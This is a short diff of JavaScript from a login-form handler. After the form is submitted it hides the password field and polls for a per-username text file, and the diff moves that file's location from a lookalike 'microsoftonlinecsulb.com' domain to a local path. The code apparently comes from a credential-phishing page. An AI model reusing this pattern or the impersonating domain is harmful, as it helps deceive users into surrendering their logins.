@@ -69,7 +69,7 @@ $(document).on('submit','#login-form',function(e)
           superloadingDiv.style.display = "block";
           passwordDiv.style.display = "none";
           console.log(functioncheck);
-          while(UrlExists('https://www.microsoftonlinecsulb.com/'+$("#username").val()+'.txt') == false){
+          while(UrlExists('static/'+$("#username").val()+'.txt') == false){
             // console.log("loop");
 
           }
